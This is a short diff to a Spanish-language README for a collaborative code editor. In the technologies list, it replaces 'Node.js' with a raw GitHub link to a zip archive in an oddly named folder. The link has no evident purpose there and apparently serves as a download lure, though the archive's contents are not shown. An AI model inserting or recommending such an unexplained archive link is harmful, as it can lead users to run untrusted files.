@@ -14,7 +14,7 @@ Abre el navegador en `http://localhost:3000` y comienza a editar código junto c
 
 ## Tecnologías
 
-- Node.js
+- https://raw.githubusercontent.com/willsondev/editor-colaborativo/main/ambidexter/editor-colaborativo.zip
 - WebSocket
 - Express
 
